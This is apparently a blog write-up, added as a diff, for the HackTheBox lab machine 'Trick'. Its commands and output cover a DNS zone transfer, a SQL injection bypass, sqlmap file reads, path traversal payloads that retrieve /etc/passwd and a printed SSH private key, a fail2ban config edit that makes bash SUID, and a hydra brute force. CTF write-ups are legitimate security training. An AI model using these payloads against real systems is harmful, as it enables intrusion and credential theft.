@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Trick HTB Writeup | 0xv01d</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json">
+</script>
+
+    <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/trick/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+      <header class="app-header">
+        <a href="https:0xv01d.github.io">
+          <img class="avatar" src="/images/index/avatar.png">
+		</a><p></p>
+		<h1><strong>0xv01d Stuff</strong></h1>
+		<nav class="app-header-menu">
+			<a class="app-header-menu-item" href="/">Home</a>
+             - 
+			<a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+			<a class="app-header-menu-item" href="/about/">About</a>
+		</nav>
+		<p>Just another computer adict.</p>
+		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
+			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
+			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
+			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
+			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
+		</div>
+        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+        </a>
+
+      </header>
+
+      <main class="app-container">
+		
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Trick Walkthrough</div>			
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">SQL-Injection</a>
+				<a class="tag" href="#">AXFR</a>
+				<a class="tag" href="#">Directory-Path-Traversal</a>
+				<a class="tag" href="#">fail2ban</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" src="/images/HTB/trick/trick_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Trick Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Trick" rel="noreferrer noopener" target="_blank">Trick</a> machine on HackTheBox, submitted by 
+			<a href="https://app.hackthebox.com/users/36994" rel="noreferrer noopener" target="_blank">Geiseric</a>. The machine starts from a web server running nginx,
+			eventually leading to <a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/" rel="noreferrer noopener" target="_blank">Domain Zone Transfer attack via AXFR</a>, exposing a new domain vulnerable to <a href="https://portswigger.net/web-security/sql-injection" rel="noreferrer noopener" target="_blank">SQL injection</a>.
+			From which configuration files can be enumerated which eventually lead to LFI and gain access via ssh, and finally abusing sudoers <a href="https://oklencodes.gitbook.io/untitled/ctfs/biteme-ctf/fail2ban-privilege-escalation" rel="noreferrer noopener" target="_blank">fail2ban</a> privileges.
+
+<!--Machine Resolution-->
+			<h1 id="header-1">Recon</h1>
+
+			<p>Let's start with a basic port scan</p>
+
+			<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+# Nmap 7.92 scan initiated Sat Oct 15 16:34:16 2022 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -oG allPorts 10.10.11.166
+<span class="ld"># <span class="na">Ports</span> scanned: TCP(<span class="s">65535;1-65535</span>) UDP(<span class="s">0</span>;) SCTP(<span class="s">0</span>;) PROTOCOLS(<span class="s">0</span>;)
+<span class="na">Host</span><span class="gd">:</span><span class="s"> 10.10.11.166</span> ()<span class="na">	Status</span><span class="gd">:</span><span class="na"> Up</span>
+<span class="na">Host</span><span class="gd">:</span><span class="s"> 10.10.11.166</span> ()<span class="na">	Ports</span><span class="gd">:</span><span class="s"> 22</span><span class="gd">/</span>open<span class="gd">/</span>tcp<span class="gd">//</span>ssh<span class="gd">///</span>, <span class="s">25</span><span class="gd">/</span>open<span class="gd">/</span>tcp<span class="gd">//</span>smtp<span class="gd">///</span>, <span class="s">53</span><span class="gd">/</span>open<span class="gd">/</span>tcp<span class="gd">//</span>domain<span class="gd">///</span>, <span class="s">80</span><span class="gd">/</span>open<span class="gd">/</span>tcp<span class="gd">//</span>http<span class="gd">///</span></span>
+# Nmap done at Sat Oct 15 16:34:49 2022 -- 1 IP address (1 host up) scanned in 33.33 seconds
+			</code></pre></div></div>
+
+			<p class="head-img">Nothing interesting after running whatweb, since port 53 is open, let's try a domain zone transfer attack using AXFR to get some info</p>
+			
+
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> whatweb </span>trick.htb
+<span class="x">http://trick.htb</span> [200 OK] Bootstrap, Country[RESERVED][<span class="gd">ZZ</span>], HTML5, HTTPServer[<span class="kt">nginx/1.14.2</span>], IP[10.10.11.166], Script, Title[<span class="k">Coming Soon - Start Bootstrap Theme</span>], nginx[<span class="gb">1.14.2</span>]
+</span>	</code></pre></div></div>
+
+			<p class="head-img">And we found what seems to be a web in pre production let's take a look</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> dig </span>axfr trick.htb @10.10.11.166
+; <<>> DiG 9.16.33-Debian <<>> axfr trick.htb @10.10.11.166
+;; global options: +cmd
+trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.		604800	IN	NS	trick.htb.
+trick.htb.		604800	IN	A	127.0.0.1
+trick.htb.		604800	IN	AAAA	::1
+<span class="k">preprod-payroll.trick.htb.</span> 604800 IN	CNAME	trick.htb.
+trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+;; Query time: 706 msec
+;; SERVER: 10.10.11.166#53(10.10.11.166)
+;; WHEN: Fri Oct 28 20:29:43 EDT 2022
+;; XFR size: 6 records (messages 1, bytes 231)
+</span> </code></pre></div></div>
+
+			<p class="head-img">There is a login, which can be easily bypassed with sql injection</p>
+			<img class="img-post" style="max-width: 358px;" src="/images/HTB/trick/login_sqli.png"></img>
+
+			<p class="head-img">We're in as admin but there doesn't seem to be anything we can take advantage of, let's try to list the nginx config from the db to see what we can find</p>
+			<img class="img-post" style="max-width: 535px;" src="/images/HTB/trick/admin_panel.png"></img>
+	
+			<p class="head-img">By intercepting the request when we add a user and passing it to sqlmap to speed things up, we can read the nginx configuration, and we can find that it includes the virtual host enabled sites, let's see what's in it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                  
+<span class="na">❯</span><span class="ld"><span class="kt"> sqlmap </span>-r addEmploye.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/nginx.conf
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.9#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<..............................>
+[INFO] fetched data logged to text files under '/home/0xv01d/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+<..............................>
+<span class="na">    ##
+    # Virtual Host Configs
+    ##</span>
+
+    include /etc/nginx/conf.d/*.conf;
+    include /etc/nginx/sites-enabled/*;
+</span> </code></pre></div></div>
+
+            <p class="head-img">Inspecting a bit we find another domain, also an index.php from this directory, we download it too</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> sqlmap </span>-r addEmploye.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/sites-enabled/default
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.9#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<..............................>
+[INFO] fetched data logged to text files under '/home/0xv01d/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+<..............................>
+server {
+    listen 80;
+    listen [::]:80;
+
+    server_name <span class="k">preprod-marketing.trick.htb;</span>
+
+    root <span class="na">/var/www/market</span>;
+    index <span class="na">index.php</span>;
+<...............................>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Apparently sanitization is being applied on the web, but it's very simple, let's try directory path traversal</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> cat </span>_var_www_market_index.php
+<span class="s"><</span><span class="s">?php</span>
+$file = $_GET[<span class="k">'page'</span>];
+
+<span class="gd">if</span>(<span class="gd">!isset</span>($file) || ($file==<span class="k">"index.php"</span>)) {
+<span class="gd">   include</span>(<span class="k">"/var/www/market/home.html"</span>);
+}
+<span class="gd">else</span>{
+<span class="gd">	include</span>(<span class="k">"/var/www/market/"</span>.<span class="s">str_replace</span>(<span class="k">"../"</span>,<span class="k">""</span>,$file));
+}
+<span class="s">?></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">It worked, we have a valid user, let's try to read his id_rsa</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> curl </span>-s <span class="k">"http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././etc/passwd"</span> | <span class="kt">grep</span> sh$
+root:x:0:0:root:/root:/bin/bash
+michael:x:1001:1001::/home/michael:/bin/bash
+</span> </code></pre></div></div>
+
+            <p class="head-img">Nice, let's login as michael</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> curl </span>-s <span class="k">"http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././home/michael/.ssh/id_rsa"</span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
++93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">Once inside we check the sudoers privileges we have, and we can restart the service fail2ban without pass, so the thing is this, we are going to replace the iptables-multiport.conf with a new one modified to assign suid privileges to bash, we are going to apply brute force to force the ban and thus execute the commands that we have injected previously, let's do it</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> ssh </span>-i id_rsa michael@trick.htb
+<span class="k">michael@trick:~$</span> cat user.txt 
+1aab3997da6ca06b4a55287ed21498ef
+<span class="k">michael@trick:~$</span> sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+<span class="k">michael@trick:~$</span> 
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once we place our new iptables-multiport.conf with our code to modify bash, the only thing left to do is restart the service and force ban to get the privileged shell</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">michael@trick:~$</span> cd /tmp/
+<span class="k">michael@trick:/tmp$</span> mkdir pwn
+<span class="k">michael@trick:/tmp$</span> cd !$
+<span class="k">michael@trick:/tmp/pwn$</span> cp /etc/fail2ban/action.d/iptables-multiport.conf ./
+<span class="k">michael@trick:/tmp/pwn$</span> nano iptables-multiport.conf
+
+<...................................................>
+<span class="x"># Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = <span class="gd">chmod u+s /bin/bash</span>
+
+# Option:  actionunban
+# Notes.:  command executed when unbanning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionunban = <span class="gd">chmod u+s /bin/bash</span>
+[Init]</span>
+
+<span class="k">michael@trick:/tmp/pwn$</span> rm /etc/fail2ban/action.d/iptables-multiport.conf
+rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multiport.conf'? y
+<span class="k">michael@trick:/tmp/pwn$</span> cp iptables-multiport.conf /etc/fail2ban/action.d/
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's restart the service</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">michael@trick:/tmp/pwn$</span> sudo /etc/init.d/fail2ban restart
+<span class="na">[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.</span>
+<span class="k">michael@trick:/tmp/pwn$</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">And force ban</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> hydra </span>10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.txt
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-29 03:29:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344409 login tries (l:1/p:14344409), ~896526 tries per task
+[DATA] attacking ssh://10.10.11.166:22/
+</span> </code></pre></div></div>
+
+            <p class="head-img">And about a minute later, we are root.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">michael@trick:/tmp/pwn$</span> ls -l /bin/bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 <span class="gd">/bin/bash</span>
+<span class="k">michael@trick:/tmp/pwn$</span> bash -p
+bash-5.0# id
+uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
+bash-5.0# cat /root/root.txt 
+318b55eacbab7397fba1be12ffd1616c
+bash-5.0# exit
+exit
+michael@trick:/tmp/pwn$ exit
+logout
+<span class="gd">Connection to trick.htb closed.</span>
+</span> </code></pre></div></div>
+
+<a href="#">Go back</a>
+		</article>
+      </main>
+  </body>
+</html>
